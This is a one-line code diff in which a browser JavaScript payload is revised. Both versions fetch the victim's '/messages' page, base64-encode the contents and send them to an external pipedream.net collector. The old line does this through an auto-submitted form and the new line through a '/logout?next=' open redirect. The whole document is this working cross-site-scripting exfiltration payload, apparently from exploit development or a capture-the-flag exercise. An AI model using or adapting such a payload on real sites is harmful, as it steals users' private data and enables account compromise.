@@ -1,1 +1,1 @@
-(async()=>{let t=await (await fetch('/messages')).text();let f=document.createElement('form');f.method='GET';f.action='https://eoeipamgnflz15n.m.pipedream.net/';let i=document.createElement('input');i.name='c';i.value=btoa(t);f.appendChild(i);document.body.appendChild(f);f.submit()})();
+(async()=>{let t=await (await fetch('/messages?id=1')).text();location='/logout?next='+encodeURIComponent('https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t))})();
